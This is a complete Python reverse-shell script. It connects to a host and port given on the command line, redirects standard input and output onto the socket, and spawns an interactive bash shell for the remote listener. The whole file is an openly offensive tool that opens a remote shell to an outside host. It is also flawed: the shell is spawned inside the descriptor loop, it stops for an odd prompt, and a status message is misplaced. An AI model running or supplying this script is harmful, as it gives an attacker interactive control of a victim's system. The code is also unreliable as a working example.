#!/usr/bin/env python3

import os
import pty
import socket
import sys

if len(sys.argv) != 3:
    print("error: wrong number of arguments", file=sys.stderr)
    print("usage: %s <host> <port>" % sys.argv[0])
    exit(1)

ip, port = sys.argv[1:]

sock = socket.socket()
sock.connect((ip, int(port)))

input("Conected.... Press Enter and send command")
for fd in range(0, 3):
    os.dup2(sock.fileno(), fd)
    pty.spawn("/bin/bash")

print("connecting to %s:%s" % (ip, port))